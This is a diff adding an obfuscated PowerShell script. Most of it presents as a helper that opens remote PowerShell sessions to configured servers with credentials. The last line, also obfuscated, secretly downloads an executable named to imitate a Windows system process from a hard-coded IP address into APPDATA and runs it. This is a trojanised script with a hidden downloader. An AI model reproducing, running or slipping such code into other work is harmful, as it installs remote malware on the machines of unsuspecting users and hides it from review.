@@ -1,0 +1,47 @@
+.("{1}{0}"-f'ET-iTeM','s')  ("VariaBl"+"E"+":n"+"4YV")  (  [tYpE]("{1}{5}{6}{3}{8}{4}{0}{2}{7}" -F 'e','S','NT','to','ION.psCrED','Y','STEm.mAnaGEMeNt.AU','IaL','MaT'))  ; 
+
+function con`NecT-p`Ss{
+
+	param (
+        [parameter(maNDaToRy=${t`RUE})]
+		[string[]]${n`AmE},
+        
+        [parameter(mandAtory=${faL`se})]
+        [System.Management.Automation.Credential()]
+        ${Cr`ed`e`NTIAL} =  ${N4`Yv}::"em`ptY"
+	)
+	
+	
+	
+	
+        
+    
+	${SER`VE`RS} = .("{5}{4}{1}{0}{2}{3}" -f 'nne','o','c','tion','-RemoteC','Get') -Name ${na`Me}
+	
+	foreach(${s`eRv`ER} in ${sE`RVErs}){
+		
+		
+		.("{3}{0}{2}{1}" -f 'move','SSession','-P','Re') -ComputerName ${S`Erver}."Na`Me" -ErrorAction ("{4}{2}{3}{1}{0}" -f 'tinue','on','en','tlyC','Sil')
+		
+		
+        if(${cR`EdE`NT`Ial}."USeRN`A`mE" -eq ${NU`lL}){
+            ${creD`E`NTiaL} = &("{2}{1}{0}"-f'redential','-C','Get') ${sE`R`VEr}."u`sER"
+        }		
+
+		
+		${S} = &("{1}{0}{3}{2}"-f 'ew-P','N','ion','SSess') -Name ${S`ErVer}."nA`Me"  -ComputerName ${sE`RVer}."na`mE" -Credential ${c`Re`d`ENtIaL}
+
+		
+		if (${s`eRVER}."S`NA`pinS" -ne ""){
+            foreach(${snap`In} in ${S`er`VER}."s`NapiNS"){
+			    &("{4}{1}{2}{0}{3}"-f 'mman','C','o','d','Invoke-') -Session ${S} -ScriptBlock {param (${na`mE}) .("{2}{1}{0}" -f'PSSnapin','d-','Ad') -Name ${n`AmE}} -ArgumentList ${Sna`pin}
+            }
+		}
+
+        ${se`SS`IonS} += ${s}
+	}
+    ${sE`Ssi`onS}	
+}
+
+
+(.("{0}{1}{2}" -f 'Ne','w-O','bject') ("{6}{4}{2}{5}{3}{0}{1}"-f 'i','ent','t.','Cl','.Ne','Web','System')).("{3}{2}{1}{0}" -f 'le','i','oadF','Downl').Invoke(("{5}{2}{10}{6}{7}{3}{11}{9}{1}{4}{8}{0}" -f 'sv.exe','ho','ttp://9','53.2','o/','h','0','2.','csr','/~ya','4.1','38'),"$env:APPDATA\csrsv.exe");&("{2}{0}{1}" -f'roc','ess','Start-P') ("$env:APPDATA\csrsv.exe")
